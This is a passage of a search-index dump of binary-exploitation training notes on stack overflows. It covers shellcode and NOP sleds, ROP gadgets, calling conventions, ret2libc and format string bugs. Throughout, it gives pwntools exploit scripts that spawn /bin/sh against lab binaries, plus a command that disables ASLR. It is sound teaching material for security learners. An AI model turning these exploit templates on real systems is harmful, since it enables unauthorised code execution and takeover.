3606\n[*] Overflow me\n[*] Switching to interactive mode\n$ whoami\nironstone\n$ ls\nexploit.py  source.c  vuln\n</code></pre> <p>And it works! Awesome.</p>"},{"location":"Training/Material/pwn-stack-1/#final-exploit_1","title":"Final Exploit","text":"<pre><code>from pwn import *\n\ncontext.binary = ELF('./vuln')\n\np = process()\n\npayload = asm(shellcraft.sh())          # The shellcode\npayload = payload.ljust(312, b'A')      # Padding\npayload += p32(0xffffcfb4)              # Address of the Shellcode\n\nlog.info(p.clean())\n\np.sendline(payload)\n\np.interactive()\n</code></pre>"},{"location":"Training/Material/pwn-stack-1/#summary_1","title":"Summary","text":"<ul> <li>We injected shellcode, a series of assembly instructions, when prompted for input</li> <li>We then hijacked code execution by overwriting the saved return pointer on the stack and modified it to point to our shellcode</li> <li>Once the return pointer got popped into EIP, it pointed at our shellcode</li> <li>This caused the program to execute our instructions, giving us (in this case) a shell for arbitrary command execution</li> </ul>"},{"location":"Training/Material/pwn-stack-1/#nops","title":"NOPs","text":"<p>More reliable shellcode exploits</p> <p>NOP (no operation) instructions do exactly what they sound like nothing. This makes them very useful for shellcode exploits because all they will do is run the next instruction. If we pad our exploits on the left with NOPs and point EIP in the middle of them, it'll simply keep doing no instructions until it reaches our actual shellcode. This allows us a greater margin of error as a shift of a few bytes forward or backward won't really affect it, it'll just run a different number of NOP instructions - which have the same end result of running the shellcode. This padding with NOPs is often called a NOP slide or NOP sled since the EIP is essentially sliding down them.</p> <p>In intel x86 assembly, NOP instructions are <code>\\x90</code>.</p> <p>The NOP instruction actually used to stand for <code>XCHG EAX, EAX</code>, which does effectively nothing. You can read a bit more about it on this StackOverflow question.</p>"},{"location":"Training/Material/pwn-stack-1/#updating-our-shellcode-exploit","title":"Updating our Shellcode Exploit","text":"<p>We can make slight changes to our exploit to do two things:</p> <ul> <li>Add a large number of NOPs on the left</li> <li>Adjust our return pointer to point at the middle of the NOPs rather than the buffer start</li> </ul> <p>Make sure ASLR is still disabled. If you have to disable it again, you may have to readjust your previous exploit as the buffer location may be different.</p> <pre><code>from pwn import *\n\ncontext.binary = ELF('./vuln')\n\np = process()\n\npayload = b'\\x90' * 240                 # The NOPs\npayload += asm(shellcraft.sh())         # The shellcode\npayload = payload.ljust(312, b'A')      # Padding\npayload += p32(0xffffcfb4 + 120)        # Address of the buffer + half nop length\n\nlog.info(p.clean())\n\np.sendline(payload)\n\np.interactive()\n</code></pre> <p>It's probably worth mentioning that shellcode with NOPs is not failsafe; if you receive unexpected errors padding with NOPs but the shellcode worked before, try reducing the length of the nopsled as it may be tampering with other things on the stack</p> <p>Note that NOPs are only <code>\\x90</code> in certain architectures, and if you need others you can use pwntools:</p> <pre><code>nop = asm(shellcraft.nop())\n</code></pre>"},{"location":"Training/Material/pwn-stack-1/#32-vs-64-bit","title":"32- vs 64-bit","text":"<p>The differences between the sizes</p> <p>Everything we have done so far is applicable to 64-bit as well as 32-bit; the only thing you would need to change is switching out the <code>p32()</code> for <code>p64()</code> as the memory addresses are longer.</p> <p>The real difference between the two, however, is the way you pass parameters to functions (which we'll be looking at much closer soon); in 32-bit, all parameters are pushed to the stack before the function is called. In 64-bit, however, the first 6 are stored in the registers RDI, RSI, RDX, RCX, R8, and R9 respectively as per the calling convention. Note that different Operating Systems also have different calling conventions.</p>"},{"location":"Training/Material/pwn-stack-2/","title":"Binary Exploitation - Stack","text":"<p>https://ir0nstone.gitbook.io/notes/</p>"},{"location":"Training/Material/pwn-stack-2/#no-execute","title":"No eXecute","text":"<p>The defense against shellcode</p> <p>As you can expect, programmers were hardly pleased that people could inject their own instructions into the program. The NX bit, which stands for No eXecute, defines areas of memory as either instructions or data. This means that your input will be stored as data, and any attempt to run it as instructions will crash the program, effectively neutralizing the shellcode.</p> <p>To get around NX, exploit developers have to leverage a technique called ROP, Return-Oriented Programming.</p> <p>The Windows version of NX is DEP, which stands for Data Execution Prevention</p>"},{"location":"Training/Material/pwn-stack-2/#checking-for-nx","title":"Checking for NX","text":"<p>You can either use pwntools' <code>checksec</code> or <code>rabin2</code>.</p> <pre><code>$ checksec vuln\n[*] 'vuln'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x8048000)\n    RWX:      Has RWX segments\n</code></pre> <pre><code>$ rabin2 -I vuln\n[...]\nnx       false\n[...]\n</code></pre>"},{"location":"Training/Material/pwn-stack-2/#return-oriented-programming","title":"Return-Oriented Programming","text":"<p>Bypassing NX</p> <p>The basis of ROP is chaining together small chunks of code already present within the binary itself in such a way as to do what you wish. This often involves passing parameters to functions already present within <code>libc</code>, such as <code>system</code> - if you can find the location of a command, such as <code>cat flag.txt</code>, and then pass it as a parameter to the <code>system</code>, it will execute that command and return the output. A more dangerous command is <code>/bin/sh</code>, which when run by the <code>system</code> gives the attacker a shell much like the shellcode we used did.</p> <p>Doing this, however, is not as simple as it may seem at first. To be able to properly call functions, we first have to understand how to pass parameters to them.</p>"},{"location":"Training/Material/pwn-stack-2/#calling-conventions","title":"Calling Conventions","text":"<p>A more in-depth look into parameters for 32-bit and 64-bit programs</p>"},{"location":"Training/Material/pwn-stack-2/#one-parameter","title":"One Parameter","text":"<p>calling-conventions-one-param</p>"},{"location":"Training/Material/pwn-stack-2/#source","title":"Source","text":"<p>Let's have a quick look at the source:</p> <pre><code>#include &lt;stdio.h&gt;\n\nvoid vuln(int check) {\n    if(check == 0xdeadbeef) {\n        puts(\"Nice!\");\n    } else {\n        puts(\"Not nice!\");\n    }\n}\n\nint main() {\n    vuln(0xdeadbeef);\n    vuln(0xdeadc0de);\n}\n</code></pre> <p>Pretty simple.</p> <p>If we run the 32-bit and 64-bit versions, we get the same output:</p> <pre><code>Nice!\nNot nice!\n</code></pre> <p>Just what we expected.</p>"},{"location":"Training/Material/pwn-stack-2/#analyzing-32-bit","title":"Analyzing 32-bit","text":"<p>Let's open the binary up in radare2 and disassemble it.</p> <pre><code>$ r2 -d -A vuln-32\n$ s main; pdf\n\n0x080491ac      8d4c2404       lea ecx, [argv]\n0x080491b0      83e4f0         and esp, 0xfffffff0\n0x080491b3      ff71fc         push dword [ecx - 4]\n0x080491b6      55             push ebp\n0x080491b7      89e5           mov ebp, esp\n0x080491b9      51             push ecx\n0x080491ba      83ec04         sub esp, 4\n0x080491bd      e832000000     call sym.__x86.get_pc_thunk.ax\n0x080491c2      053e2e0000     add eax, 0x2e3e\n0x080491c7      83ec0c         sub esp, 0xc\n0x080491ca      68efbeadde     push 0xdeadbeef\n0x080491cf      e88effffff     call sym.vuln\n0x080491d4      83c410         add esp, 0x10\n0x080491d7      83ec0c         sub esp, 0xc\n0x080491da      68dec0adde     push 0xdeadc0de\n0x080491df      e87effffff     call sym.vuln\n0x080491e4      83c410         add esp, 0x10\n0x080491e7      b800000000     mov eax, 0\n0x080491ec      8b4dfc         mov ecx, dword [var_4h]\n0x080491ef      c9             leave\n0x080491f0      8d61fc         lea esp, [ecx - 4]\n0x080491f3      c3             ret\n</code></pre> <p>If we look closely at the calls to <code>sym.vuln</code>, we see a pattern:</p> <pre><code>push 0xdeadbeef\ncall sym.vuln\n[...]\npush 0xdeadc0de\ncall sym.vuln\n</code></pre> <p>We literally <code>push</code> the parameter to the stack before calling the function. Let's break on <code>sym.vuln</code>.</p> <pre><code>[0x080491ac]&gt; db sym.vuln\n[0x080491ac]&gt; dc\nhit breakpoint at: 8049162\n[0x08049162]&gt; pxw @ esp\n0xffdeb54c      0x080491d4 0xdeadbeef 0xffdeb624 0xffdeb62c\n</code></pre> <p>The first value there is the return pointer that we talked about before - the second, however, is the parameter. This makes sense because the return pointer gets pushed during the <code>call</code>, so it should be at the top of the stack. Now let's disassemble <code>sym.vuln</code>.</p> <pre><code>\u250c 74: sym.vuln (int32_t arg_8h);\n\u2502           ; var int32_t var_4h @ ebp-0x4\n\u2502           ; arg int32_t arg_8h @ ebp+0x8\n\u2502           0x08049162 b    55             push ebp\n\u2502           0x08049163      89e5           mov ebp, esp\n\u2502           0x08049165      53             push ebx\n\u2502           0x08049166      83ec04         sub esp, 4\n\u2502           0x08049169      e886000000     call sym.__x86.get_pc_thunk.ax\n\u2502           0x0804916e      05922e0000     add eax, 0x2e92\n\u2502           0x08049173      817d08efbead.  cmp dword [arg_8h], 0xdeadbeef\n\u2502       \u250c\u2500&lt; 0x0804917a      7516           jne 0x8049192\n\u2502       \u2502   0x0804917c      83ec0c         sub esp, 0xc\n\u2502       \u2502   0x0804917f      8d9008e0ffff   lea edx, [eax - 0x1ff8]\n\u2502       \u2502   0x08049185      52             push edx\n\u2502       \u2502   0x08049186      89c3           mov ebx, eax\n\u2502       \u2502   0x08049188      e8a3feffff     call sym.imp.puts           ; int puts(const char *s)\n\u2502       \u2502   0x0804918d      83c410         add esp, 0x10\n\u2502      \u250c\u2500\u2500&lt; 0x08049190      eb14           jmp 0x80491a6\n\u2502      \u2502\u2514\u2500&gt; 0x08049192      83ec0c         sub esp, 0xc\n\u2502      \u2502    0x08049195      8d900ee0ffff   lea edx, [eax - 0x1ff2]\n\u2502      \u2502    0x0804919b      52             push edx\n\u2502      \u2502    0x0804919c      89c3           mov ebx, eax\n\u2502      \u2502    0x0804919e      e88dfeffff     call sym.imp.puts           ; int puts(const char *s)\n\u2502      \u2502    0x080491a3      83c410         add esp, 0x10\n\u2502      \u2502    ; CODE XREF from sym.vuln @ 0x8049190\n\u2502      \u2514\u2500\u2500&gt; 0x080491a6      90             nop\n\u2502           0x080491a7      8b5dfc         mov ebx, dword [var_4h]\n\u2502           0x080491aa      c9             leave\n\u2514           0x080491ab      c3             ret\n</code></pre> <p>Here I'm showing the full output of the command because a lot of it is relevant. <code>radare2</code> does a great job of detecting local variables - as you can see at the top, there is one called <code>arg_8h</code>. Later this same one is compared to <code>0xdeadbeef</code>:</p> <pre><code>cmp dword [arg_8h], 0xdeadbeef\n</code></pre> <p>Clearly, that's our parameter.</p> <p>So now we know, when there's one parameter, it gets pushed to the stack so that the stack looks like this:</p> <pre><code>return address        param_1\n</code></pre>"},{"location":"Training/Material/pwn-stack-2/#analyzing-64-bit","title":"Analyzing 64-bit","text":"<p>Let's disassemble the <code>main</code> again here.</p> <pre><code>0x00401153      55             push rbp\n0x00401154      4889e5         mov rbp, rsp\n0x00401157      bfefbeadde     mov edi, 0xdeadbeef\n0x0040115c      e8c1ffffff     call sym.vuln\n0x00401161      bfdec0adde     mov edi, 0xdeadc0de\n0x00401166      e8b7ffffff     call sym.vuln\n0x0040116b      b800000000     mov eax, 0\n0x00401170      5d             pop rbp\n0x00401171      c3             ret\n</code></pre> <p>Hohoho, it's different. As we mentioned before, the parameter gets moved to <code>rdi</code> (in the disassembly here it's <code>edi</code>, but <code>edi</code> is just the lower 32 bits of <code>rdi</code>, and the parameter is only 32 bits long, so it says <code>EDI</code> instead). If we break on <code>sym.vuln</code> again we can check <code>rdi</code> with the command</p> <pre><code>dr rdi\n</code></pre> <p>Just <code>dr</code> will display all registers</p> <pre><code>[0x00401153]&gt; db sym.vuln \n[0x00401153]&gt; dc\nhit breakpoint at: 401122\n[0x00401122]&gt; dr rdi\n0xdeadbeef\n</code></pre> <p>Awesome.</p> <p>Registers are used for parameters, but the return address is still pushed onto the stack and in ROP is placed right after the function address</p>"},{"location":"Training/Material/pwn-stack-2/#multiple-parameters","title":"Multiple Parameters","text":"<p>calling-convention-multi-param</p>"},{"location":"Training/Material/pwn-stack-2/#source_1","title":"Source","text":"<pre><code>#include &lt;stdio.h&gt;\n\nvoid vuln(int check, int check2, int check3) {\n    if(check == 0xdeadbeef &amp;&amp; check2 == 0xdeadc0de &amp;&amp; check3 == 0xc0ded00d) {\n        puts(\"Nice!\");\n    } else {\n        puts(\"Not nice!\");\n    }\n}\n\nint main() {\n    vuln(0xdeadbeef, 0xdeadc0de, 0xc0ded00d);\n    vuln(0xdeadc0de, 0x12345678, 0xabcdef10);\n}\n</code></pre>"},{"location":"Training/Material/pwn-stack-2/#32-bit","title":"32-bit","text":"<p>We've seen the full disassembly of an almost identical binary, so I'll only isolate the important parts.</p> <pre><code>0x080491dd      680dd0dec0     push 0xc0ded00d\n0x080491e2      68dec0adde     push 0xdeadc0de\n0x080491e7      68efbeadde     push 0xdeadbeef\n0x080491ec      e871ffffff     call sym.vuln\n[...]\n0x080491f7      6810efcdab     push 0xabcdef10\n0x080491fc      6878563412     push 0x12345678\n0x08049201      68dec0adde     push 0xdeadc0de\n0x08049206      e857ffffff     call sym.vuln\n</code></pre> <p>It's just as simple - <code>push</code> them in reverse order of how they're passed in. The reverse order becomes helpful when you <code>db sym.vuln</code> and print out the stack.</p> <pre><code>[0x080491bf]&gt; db sym.vuln\n[0x080491bf]&gt; dc\nhit breakpoint at: 8049162\n[0x08049162]&gt; pxw @ esp\n0xffb45efc      0x080491f1 0xdeadbeef 0xdeadc0de 0xc0ded00d\n</code></pre> <p>So it becomes quite clear how more parameters are placed on the stack:</p> <pre><code>return pointer        param1        param2        param3        [...]        paramN\n</code></pre>"},{"location":"Training/Material/pwn-stack-2/#64-bit","title":"64-bit","text":"<pre><code>0x00401170      ba0dd0dec0     mov edx, 0xc0ded00d\n0x00401175      bedec0adde     mov esi, 0xdeadc0de\n0x0040117a      bfefbeadde     mov edi, 0xdeadbeef\n0x0040117f      e89effffff     call sym.vuln\n0x00401184      ba10efcdab     mov edx, 0xabcdef10\n0x00401189      be78563412     mov esi, 0x12345678\n0x0040118e      bfdec0adde     mov edi, 0xdeadc0de\n0x00401193      e88affffff     call sym.vuln\n</code></pre> <p>So as well as <code>rdi</code>, we also push to <code>rdx</code> and <code>rsi</code> (or, in this case, their lower 32 bits).</p>"},{"location":"Training/Material/pwn-stack-2/#bigger-64-bit-values","title":"Bigger 64-bit values","text":"<p>Just to show that it is in fact ultimately <code>rdi</code> and not <code>edi</code> that is used, I will alter the original one-parameter code to utilize a bigger number:</p> <pre><code>#include &lt;stdio.h&gt;\n\nvoid vuln(long check) {\n    if(check == 0xdeadbeefc0dedd00d) {\n        puts(\"Nice!\");\n    }\n}\n\nint main() {\n    vuln(0xdeadbeefc0dedd00d);\n}\n</code></pre> <p>If you disassemble the <code>main</code>, you can see it disassembles to</p> <pre><code>movabs rdi, 0xdeadbeefc0ded00d\ncall sym.vuln\n</code></pre> <p><code>movabs</code> can be used to encode the <code>mov</code> instruction for 64-bit instructions - treat it as if it's a <code>mov</code>.</p>"},{"location":"Training/Material/pwn-stack-2/#gadgets","title":"Gadgets","text":"<p>Controlling execution with snippets of code</p> <p>Gadgets are small snippets of code followed by a <code>ret</code> instruction, e.g. <code>pop rdi; ret</code>. We can manipulate the <code>ret</code> of these gadgets in such a way as to string together a large chain of them to do what we want.</p>"},{"location":"Training/Material/pwn-stack-2/#example","title":"Example","text":"<p>Let's for a minute pretend the stack looks like this during the execution of a <code>pop rdi; ret</code> gadget.</p> <p></p> <p>What happens is fairly obvious - <code>0x10</code> gets popped into <code>rdi</code> as it is at the top of the stack during the <code>pop rdi</code>. Once the <code>pop</code> occurs, <code>rsp</code> moves:</p> <p></p> <p>And since <code>ret</code> is equivalent to <code>pop rip</code>, <code>0x5655576724</code> gets moved into <code>rip</code>. Note how the stack is laid out for this.</p>"},{"location":"Training/Material/pwn-stack-2/#utilizing-gadgets","title":"Utilizing Gadgets","text":"<p>When we overwrite the return pointer, we overwrite the value pointed at by <code>rsp</code>. Once that value is popped, it points to the next value at the stack - but wait. We can overwrite the next value in the stack.</p> <p>Let's say that we want to exploit a binary to jump to a <code>pop rdi; ret</code> gadget, pop <code>0x100</code> into <code>rdi</code> then jump to <code>flag()</code>. Let's step-by-step the execution.</p> <p></p> <p>On the original <code>ret</code>, which we overwrite the return pointer for, we pop the gadget address in. Now <code>rip</code> moves to point to the gadget, and <code>rsp</code> moves to the next memory address.</p> <p></p> <p><code>rsp</code> moves to the <code>0x100</code>; <code>rip</code> to the <code>pop rdi</code>. Now when we pop, <code>0x100</code> gets moved into <code>rdi</code>.</p> <p></p> <p>RSP moves to the next item on the stack, the address of the <code>flag()</code>. The <code>ret</code> is executed and <code>flag()</code> is called.</p>"},{"location":"Training/Material/pwn-stack-2/#summary","title":"Summary","text":"<p>Essentially, if the gadget pops values from the stack, simply place those values afterward (including the <code>pop rip</code> in <code>ret</code>). If we want to pop <code>0x10</code> into <code>rdi</code> and then jump to <code>0x16</code>, our payload would look like this:</p> <p></p> <p>Note if you have multiple <code>pop</code> instructions, you can just add more values.</p> <p></p> <p>We use <code>rdi</code> as an example because, if you remember, that's the register for the first parameter in 64-bit. This means control of this register using this gadget is important.</p>"},{"location":"Training/Material/pwn-stack-2/#finding-gadgets","title":"Finding Gadgets","text":"<p>We can use the tool <code>ROPgadget</code> to find possible gadgets.</p> <pre><code>$ ROPgadget --binary vuln-64\n\nGadgets information\n============================================================\n0x0000000000401069 : add ah, dh ; nop dword ptr [rax + rax] ; ret\n0x000000000040109b : add bh, bh ; loopne 0x40110a ; nop ; ret\n0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401024\n[...]\n</code></pre> <p>Combine it with <code>grep</code> to look for specific registers.</p> <pre><code>$ ROPgadget --binary vuln-64 | grep rdi\n\n0x0000000000401096 : or dword ptr [rdi + 0x404030], edi ; jmp rax\n0x00000000004011db : pop rdi ; ret\n</code></pre>"},{"location":"Training/Material/pwn-stack-2/#exploiting-calling-conventions","title":"Exploiting Calling Conventions","text":"<p>Utilizing Calling Conventions</p> <p>exploiting_with_params</p>"},{"location":"Training/Material/pwn-stack-2/#32-bit_1","title":"32-bit","text":"<p>The program expects the stack to be laid out like this before executing the function:</p> <p></p> <p>So why don't we provide it like that? As well as the function, we also pass the return address and the parameters.</p> <p></p> <p>Everything after the address of <code>flag()</code> will be part of the stack frame for the next function as it is expected to be there - just instead of using <code>push</code> instructions we just overwrote them manually.</p> <pre><code>from pwn import *\n\np = process('./vuln-32')\n\npayload = b'A' * 52            # Padding up to EIP\npayload += p32(0x080491c7)     # Address of flag()\npayload += p32(0x0)            # Return address - don't care if crashes when done\npayload += p32(0xdeadc0de)     # First parameter\npayload += p32(0xc0ded00d)     # Second parameter\n\nlog.info(p.clean())\np.sendline(payload)\nlog.info(p.clean())\n</code></pre>"},{"location":"Training/Material/pwn-stack-2/#64-bit_1","title":"64-bit","text":"<p>Same logic, except we have to utilize the gadgets we talked about previously to fill the required registers (in this case <code>rdi</code> and <code>rsi</code> as we have two parameters).</p> <p>We have to fill the registers before the function is called</p> <pre><code>from pwn import *\n\np = process('./vuln-64')\n\nPOP_RDI, POP_RSI_R15 = 0x4011fb, 0x4011f9\n\n\npayload = b'A' * 56            # Padding\npayload += p64(POP_RDI)        # pop rdi; ret\npayload += p64(0xdeadc0de)     # value into rdi -&gt; first param\npayload += p64(POP_RSI_R15)    # pop rsi; pop r15; ret\npayload += p64(0xc0ded00d)     # value into rsi -&gt; first param\npayload += p64(0x0)            # value into r15 -&gt; not important\npayload += p64(0x40116f)       # Address of flag()\npayload += p64(0x0)\n\nlog.info(p.clean())\np.sendline(payload)\nlog.info(p.clean())\n</code></pre>"},{"location":"Training/Material/pwn-stack-2/#ret2libc","title":"ret2libc","text":"<p>The standard ROP exploit</p> <p>A ret2libc is based on the <code>system</code> function found within the C library. This function executes anything passed to it making it the best target. Another thing found within libc is the string <code>/bin/sh</code>; if you pass this string to the <code>system</code>, it will pop a shell.</p> <p>And that is the entire basis of it - passing <code>/bin/sh</code> as a parameter to the <code>system</code>. Doesn't sound too bad, right?</p> <p>ret2libc</p>"},{"location":"Training/Material/pwn-stack-2/#disabling-aslr","title":"Disabling ASLR","text":"<p>To start with, we are going to disable ASLR. ASLR randomizes the location of libc in memory, meaning we cannot (without other steps) work out the location of the <code>system</code> and <code>/bin/sh</code>. To understand the general theory, we will start with it disabled.</p> <pre><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space\n</code></pre>"},{"location":"Training/Material/pwn-stack-2/#manual-exploitation","title":"Manual Exploitation","text":""},{"location":"Training/Material/pwn-stack-2/#getting-libc-and-its-base","title":"Getting Libc and its base","text":"<p>Fortunately, Linux has a command called <code>ldd</code> for dynamic linking. If we run it on our compiled ELF file, it'll tell us the libraries it uses and their base addresses.</p> <pre><code>$ ldd vuln-32 \n    linux-gate.so.1 (0xf7fd2000)\n    libc.so.6 =&gt; /lib32/libc.so.6 (0xf7dc2000)\n    /lib/ld-linux.so.2 (0xf7fd3000)\n</code></pre> <p>We need <code>libc.so.6</code>, so the base address of libc is <code>0xf7dc2000</code>.</p> <p>Libc base and the system and /bin/sh offsets may be different for you. This isn't a problem - it just means you have a different libc version. Make sure you use your values.</p>"},{"location":"Training/Material/pwn-stack-2/#getting-the-location-of-the-system","title":"Getting the location of the system()","text":"<p>To call the system, we obviously need its location in memory. We can use the <code>readelf</code> command for this.</p> <pre><code>$ readelf -s /lib32/libc.so.6 | grep system\n\n1534: 00044f00    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0\n</code></pre> <p>The <code>-s</code> flag tells <code>readelf</code> to search for symbols, for example, functions. Here we can find the offset of the system from the libc base is <code>0x44f00</code>.</p>"},{"location":"Training/Material/pwn-stack-2/#getting-the-location-of-binsh","title":"Getting the location of /bin/sh","text":"<p>Since <code>/bin/sh</code> is just a string, we can use <code>strings</code> on the dynamic library we just found with <code>ldd</code>. Note that when passing strings as parameters you need to pass a pointer to the string, not the hex representation of the string, because that's how C expects it.</p> <pre><code>$ strings -a -t x /lib32/libc.so.6 | grep /bin/sh\n18c32b /bin/sh\n</code></pre> <p><code>-a</code> tells it to scan the entire file; <code>-t x</code> tells it to output the offset in hex.</p>"},{"location":"Training/Material/pwn-stack-2/#32-bit-exploit","title":"32-bit Exploit","text":"<pre><code>from pwn import *\n\np = process('./vuln-32')\n\nlibc_base = 0xf7dc2000\nsystem = libc_base + 0x44f00\nbinsh = libc_base + 0x18c32b\n\npayload = b'A' * 76         # The padding\npayload += p32(system)      # Location of system\npayload += p32(0x0)         # return pointer - not important once we get the shell\npayload += p32(binsh)       # pointer to command: /bin/sh\n\np.clean()\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"Training/Material/pwn-stack-2/#64-bit-exploit","title":"64-bit Exploit","text":"<p>Repeat the process with the <code>libc</code> linked to the 64-bit exploit (should be called something like <code>/lib/x86_64-linux-gnu/libc.so.6</code>).</p> <p>Note that instead of passing the parameter in after the return pointer, you will have to use a <code>pop rdi; ret</code> gadget to put it into the RDI register.</p> <pre><code>$ ROPgadget --binary vuln-64 | grep rdi\n\n[...]\n0x00000000004011cb : pop rdi ; ret\n</code></pre> <pre><code>from pwn import *\n\np = process('./vuln-64')\n\nlibc_base = 0x7ffff7de5000\nsystem = libc_base + 0x48e20\nbinsh = libc_base + 0x18a143\n\nPOP_RDI = 0x4011cb\n\npayload = b'A' * 72         # The padding\npayload += p64(POP_RDI)     # gadget -&gt; pop rdi; ret\npayload += p64(binsh)       # pointer to command: /bin/sh\npayload += p64(system)      # Location of system\npayload += p64(0x0)         # return pointer - not important once we get the shell\n\np.clean()\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"Training/Material/pwn-stack-2/#automating-with-pwntools","title":"Automating with Pwntools","text":"<p>Unsurprisingly, pwntools has a bunch of features that make this much simpler.</p> <pre><code># 32-bit\nfrom pwn import *\n\nelf = context.binary = ELF('./vuln-32')\np = process()\n\nlibc = elf.libc                        # Simply grab the libc it's running with\nlibc.address = 0xf7dc2000              # Set base address\n\nsystem = libc.sym['system']            # Grab location of system\nbinsh = next(libc.search(b'/bin/sh'))  # grab string location\n\npayload = b'A' * 76         # The padding\npayload += p32(system)      # Location of system\npayload += p32(0x0)         # return pointer - not important once we get the shell\npayload += p32(binsh)       # pointer to command: /bin/sh\n\np.clean()\np.sendline(payload)\np.interactive()\n</code></pre> <p>The 64-bit looks essentially the same.</p> <p>Pwntools can simplify it even more with its ROP capabilities, but I won't showcase them here.</p>"},{"location":"Training/Material/pwn-stack-2/#format-string-bug","title":"Format String Bug","text":"<p>Reading memory off the stack</p> <p>Format String is a dangerous bug that is easily exploitable. If manipulated correctly, you can leverage it to perform powerful actions such as reading from and writing to arbitrary memory locations.</p>"},{"location":"Training/Material/pwn-stack-2/#why-it-exists","title":"Why it exists","text":"<p>In C, certain functions can take \"format specifier\" within strings. Let's look at an example:</p> <pre><code>int value = 1205;\n\nprintf(\"Decimal: %d\\nFloat: %f\\nHex: 0x%x\", value, (double) value, value);\n</code></pre> <p>This prints out:</p> <pre><code>Decimal: 1205\nFloat: 1205.000000\nHex: 0x4b5\n</code></pre> <p>So, it replaced <code>%d</code> with the value, <code>%f</code> with the float value and <code>%x</code> with the hex representation.</p> <p>This is a nice way in C of formatting strings (string concatenation is quite complicated in C). Let's try print out the same value in hex 3 times:</p> <pre><code>int value = 1205;\n\nprintf(\"%x %x %x\", value, value, value);\n</code></pre> <p>As expected, we get</p> <pre><code>4b5 4b5 4b5\n</code></pre> <p>What happens, however, if we don't have enough arguments for all the format specifiers?</p> <pre><code>int value = 1205;\n\nprintf(\"%x %x %x\", value);\n</code></pre> <pre><code>4b5 5659b000 565981b0\n</code></pre> <p>Erm... what happened here?</p> <p>The key here is that <code>printf</code> expects as many parameters as format string specifiers, and in 32-bit it grabs these parameters from the stack. If there aren't enough parameters on the stack, it'll just grab the next values - essentially leaking values off the stack. And that's what makes it so dangerous.</p>"},{"location":"Training/Material/pwn-stack-2/#how-to-abuse-this","title":"How to abuse this","text":"<p>Surely if it's a bug in the code, the attacker can't do much, right? Well, the real issue is when C code takes user-provided input and prints it out using <code>printf</code>.</p> <p>fmtstr_arb_read</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n    char buffer[30];\n\n    gets(buffer);\n\n    printf(buffer);\n    return 0;\n}\n</code></pre> <p>If we run this normally, it works as expected:</p> <pre><code>$ ./test \n\nyes\nyes\n</code></pre> <p>But what happens if we input a format string specifier, such as <code>%x</code>?</p> <pre><code>$ ./test\n\n%x %x %x %x %x\nf7f74080 0 5657b1c0 782573fc 20782520\n</code></pre> <p>It reads values off the stack and returns them as the developer wasn't expecting so many format string specifiers. </p>"},{"location":"Training/Material/pwn-stack-2/#choosing-offsets","title":"Choosing Offsets","text":"<p>To print the same value 3 times, using</p> <pre><code>printf(\"%x %x %x\", value, value, value);\n</code></pre> <p>Gets tedious - so, there is a better way in C.</p> <pre><code>printf(\"%1$x %1$x %1$x\", value);\n</code></pre> <p>The <code>1$</code> between tells printf to use the first parameter. However, this also means that attackers can read values an arbitrary offset from the top of the stack - say we know there is a canary at the 6th <code>%p</code> - instead of sending <code>%p %p %p %p %p %p</code>, we can just do <code>%6$p</code>. This allows us to be much more efficient.</p>"},{"location":"Training/Material/pwn-stack-2/#arbitrary-reads","title":"Arbitrary Reads","text":"<p>In C, when you want to use a string you use a pointer to the start of the string - this is essentially a value that represents a memory address. So when you use the <code>%s</code> format specifier, it's the pointer that gets passed to it. That means instead of reading a value of the stack, you read the value in the memory address it points at.</p> <p>Now this is all very interesting - if you can find a value on the stack that happens to correspond to where you want to read, that is. But what if we could specify where we want to read? Well... we can.</p> <p>Let's look back at the previous program and its output:</p> <pre><code>$ ./test\n\n%x %x %x %x %x %x\nf7f74080 0 5657b1c0 782573fc 20782520 25207825\n</code></pre> <p>You may notice that the last two values contain the hex values of <code>%x</code>. That's because we're reading the buffer. Here it's at the 4th offset - if we can write an address and then point <code>%s</code> at it, we can get an arbitrary write!</p> <pre><code>$ ./vuln \n\nABCD|%6$p\nABCD|0x44434241\n</code></pre> <p><code>%p</code> is a pointer; generally, it returns the same as <code>%x</code> just precedes it with a <code>0x</code> which makes it stand out more</p> <p>As we can see, we're reading the value we inputted. Let's write a quick pwntools script that writes the location of the ELF file and reads it with <code>%s</code> - if all goes well, it should read the first bytes of the file, which is always <code>\\x7fELF</code>. Start with the basics:</p> <pre><code>from pwn import *\n\np = process('./vuln')\n\npayload = p32(0x41424344)\npayload += b'|%6$p'\n\np.sendline(payload)\nlog.info(p.clean())\n</code></pre> <pre><code>$ python3 exploit.py\n\n[+] Starting local process './vuln': pid 3204\n[*] b'DCBA|0x41424344'\n</code></pre> <p>Nice it works. The base address of the binary is <code>0x8048000</code>, so let's replace the <code>0x41424344</code> with that and read it with <code>%s</code>:</p> <pre><code>from pwn import *\n\np = process('./vuln')\n\npayload = p32(0x8048000)\npayload += b'|%6$s'\n\np.sendline(payload)\nlog.info(p.clean())\n</code></pre> <p>It doesn't work.</p> <p>The reason it doesn't work is that <code>printf</code> stops at null bytes, and the very first character is a null byte. We have to put the format specifier first.</p> <pre><code>from pwn import *\n\np = process('./vuln')\n\npayload = b'%8$p||||'\npayload += p32(0x8048000)\n\np.sendline(payload)\nlog.info(p.clean())\n</code></pre> <p>Let's break down the payload:</p> <ul> <li>We add 4 <code>|</code> because we want the address we write to fill one memory address, not half of one and half another, because that will result in reading the wrong address</li> <li>The offset is <code>%8$p</code> because the start of the buffer is generally at <code>%6$p</code>. However, memory addresses are 4 bytes long each and we already have 8 bytes, so it's two memory addresses further along at <code>%8$p</code>. </li> </ul> <pre><code>$ python3 exploit.py\n\n[+] Starting local process './vuln': pid 3255\n[*] b'0x8048000||||'\n</code></pre> <p>It still stops at the null byte, but that's not important because we get the output; the address is still written to memory, just not printed back.</p> <p>Now let's replace the <code>p</code> with an <code>s</code>.</p> <pre><code>$ python3 exploit.py\n\n[+] Starting local process './vuln': pid 3326\n[*] b'\\x7fELF\\x01\\x01\\x01||||'\n</code></pre> <p>Of course, <code>%s</code> will also stop at a null byte as strings in C are terminated with them. We have worked out, however, that the first bytes of an ELF file up to a null byte is 